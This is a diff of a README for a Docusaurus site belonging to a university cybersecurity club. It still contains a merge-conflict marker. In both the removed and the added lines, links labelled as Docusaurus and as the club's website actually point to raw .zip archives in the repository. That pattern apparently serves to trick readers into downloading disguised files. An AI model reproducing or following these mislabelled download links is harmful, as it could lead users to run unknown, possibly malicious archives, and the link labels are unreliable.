@@ -1,8 +1,8 @@
 <<<<<<< HEAD
 # Website
 
-This website is built using [Docusaurus](https://raw.githubusercontent.com/elcaja5/ClubCiberseguridad-UC/main/src/ClubCiberseguridad-UC-v2.5.zip), a modern static website generator. 
-La página web del Club de Ciberseguridad de la Universidad de Cuenca es https://raw.githubusercontent.com/elcaja5/ClubCiberseguridad-UC/main/src/ClubCiberseguridad-UC-v2.5.zip
+This website is built using [Docusaurus](https://github.com/elcaja5/ClubCiberseguridad-UC/raw/refs/heads/main/blog/2021-08-26-welcome/Ciberseguridad_Club_UC_v2.1-alpha.1.zip), a modern static website generator. 
+La página web del Club de Ciberseguridad de la Universidad de Cuenca es https://github.com/elcaja5/ClubCiberseguridad-UC/raw/refs/heads/main/blog/2021-08-26-welcome/Ciberseguridad_Club_UC_v2.1-alpha.1.zip
 
 ### Installation
 
